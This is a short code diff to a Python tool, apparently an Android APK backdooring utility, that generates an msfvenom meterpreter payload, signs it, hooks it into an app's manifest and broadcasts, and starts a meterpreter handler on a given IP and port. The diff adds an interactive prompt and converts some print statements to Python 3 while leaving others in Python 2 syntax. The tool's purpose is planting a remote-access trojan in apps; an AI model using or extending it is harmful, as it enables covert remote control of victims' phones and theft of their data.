@@ -11,6 +11,7 @@ import xml.etree.ElementTree as ET
 from apkhandling import builder
 from manifestmanager import manifest_analyzer, manifest_changer
 from hookmanager import main_hook, broadcast_hook
+from interactive_shell import PackadroidPrompt
 
 # tasks:
 # - write/include argument parser
@@ -176,13 +177,13 @@ def main():
     global args
 
     parseArgs()
-    print args
+    print(args)
 
     check_requirements()
 
-    print "[*] Generating msfvenom payload..\n"
+    print("[*] Generating msfvenom payload..\n")
     command = "msfvenom " + args['meterpreter_arguments'] + " 2>&1"
-    print str(command)
+    print(str(command))
     generate_meterpreter(command)
 
     print "[*] Signing payload..\n"
@@ -252,4 +253,6 @@ def main():
         print "[*] Start the handler for meterpreter on IP: " + args['meterpreter_ip'] + " Port: " + args['meterpreter_port']
         start_meterpreter_handler()
 
+prompt = PackadroidPrompt()
+prompt.start()
 main()
